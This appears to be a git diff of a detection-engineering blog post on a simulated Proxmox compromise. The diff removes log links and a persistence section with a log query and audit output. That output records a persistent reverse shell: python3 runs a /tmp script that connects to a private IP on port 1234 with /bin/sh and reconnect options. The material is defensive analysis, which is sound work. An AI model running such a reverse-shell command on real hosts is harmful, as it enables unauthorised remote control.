@@ -201,9 +201,6 @@ Find: A LOLBIN kept on all debian hosts.
 ]
 ```
 
-**View the full log here:**
-[sim_proxmox_backupenum_rawlogs.json]({{ site.url }}\assets\proxmox_death\sim_proxmox_backupenum_rawlogs.json)
-
 lvdisplay: LOLbin that displays volume information
 
 ```jsx
@@ -236,81 +233,8 @@ lvdisplay: LOLbin that displays volume information
 ]
 ```
 
-**View the full log here:**
-[sim_proxmox_lvdisplay_rawlog.json]({{ site.url }}\assets\proxmox_death\sim_proxmox_lvdisplay_rawlogs.json)
 
 #### Detection Analytics
 
 INSERT
 
-## Resilient Persistence
-
-Once initial access was acquired a reverse shell was established to provide connectivity to attacker controlled infrastructure. Immediately upon connection the file ‘tmplqlhyo0z’ was written to ‘/tmp/’ and regularly invoked through the python script interpreter. This served as a more robust persistence mechanism that would survive shell sessions being forcefully closed.
-
-
-To begin we first establish events that are applicable.
-
-{% highlight js %}
-// all audit events
-#type = "linux-audit"
-| "Vendor.audit_counter" = 2008
-| case {
-  Vendor.audit_type = "PROCTITLE"
-  | Vendor.audit_content := process.command_line;
-
-  *
-  
-}
-| groupBy(Vendor.audit_type, "Vendor.audit_content", function=min("@timestamp", as="first_event"))
-
-{% endhighlight %}
-
-This analytic sets an anchor on the audit_counter field. This field is unique for each process execution event but not globally unique within the full context of a systems events.
-
-Result events are -
-{% highlight json-doc %}
-[
-  {
-    "first_event": "1781007172596",
-    "Vendor.audit_type": "EXECVE",
-    "Vendor.audit_content": "argc=9 a0=\"/usr/bin/python3\" a1=\"/tmp/tmplqlhyo0z\" a2=\"192.168.1.157\" a3=\"1234\" a4=\"--exec\" a5=\"/bin/sh\" a6=\"--reconn\" a7=\"--reconn-wait\" a8=\"1\""
-  },
-  {
-    "first_event": "1781007172596",
-    "Vendor.audit_type": "PATH",
-    "Vendor.audit_content": "item=0 name=\"/usr/bin/python3\" inode=260881 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0"
-  },
-  {
-    "first_event": "1781005807135",
-    "Vendor.audit_type": "PATH",
-    "Vendor.audit_content": "item=0 name=\"/usr/local/sbin/nft\" nametype=UNKNOWN cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0"
-  },
-  {
-    "first_event": "1781007172596",
-    "Vendor.audit_type": "PATH",
-    "Vendor.audit_content": "item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=264121 dev=fc:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 cap_frootid=0"
-  },
-  {
-    "first_event": "1781005807135",
-    "Vendor.audit_type": "PROCTITLE",
-    "Vendor.audit_content": "/usr/libexec/proxmox/proxmox-firewall\u0000start"
-  },
-  {
-    "first_event": "1781007172596",
-    "Vendor.audit_type": "PROCTITLE",
-    "Vendor.audit_content": "nohup\u0000/usr/bin/python3\u0000/tmp/tmplqlhyo0z\u0000192.168.1.157\u00001234\u0000--exec\u0000/bin/sh\u0000--reconn\u0000--reconn-wait\u00001"
-  },
-  {
-    "first_event": "1781005807135",
-    "Vendor.audit_type": "SYSCALL",
-    "Vendor.audit_content": "arch=c000003e syscall=59 success=no exit=-2 a0=7d9a03ad3da0 a1=6171138693b0 a2=7ffd28771fb0 a3=8 items=1 ppid=985 pid=2363 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm=\"proxmox-firewal\" exe=\"/usr/libexec/proxmox/proxmox-firewall\" subj=unconfined key=\"exec\""
-  },
-  {
-    "first_event": "1781007172596",
-    "Vendor.audit_type": "SYSCALL",
-    "Vendor.audit_content": "arch=c000003e syscall=59 success=yes exit=0 a0=7ffff7fbcd8b a1=7ffff7fbb770 a2=7ffff7fbb7c0 a3=8 items=2 ppid=2546 pid=2579 auid=0 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=1 comm=\"python3\" exe=\"/usr/bin/python3.13\" subj=unconfined key=\"exec\""
-  }
-]
-
-
-{% endhighlight %}
